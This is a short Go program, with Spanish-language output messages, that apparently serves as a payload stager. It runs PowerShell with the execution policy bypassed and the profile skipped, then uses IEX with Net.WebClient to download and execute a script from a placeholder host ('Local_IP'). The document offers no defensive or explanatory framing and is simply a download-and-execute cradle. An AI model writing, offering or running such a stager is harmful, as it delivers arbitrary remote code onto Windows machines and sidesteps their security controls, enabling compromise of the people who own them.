package main

import (
	"fmt"
	"os/exec"
)

func main() {
	cmd := exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-NoProfile", "-Command",
		"IEX (New-Object Net.WebClient).DownloadString('http://Local_IP/powershellfile.txt')")
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("Error ejecutando el comando:", err)
		return
	}
	fmt.Println("Salida del comando:", string(output))
}
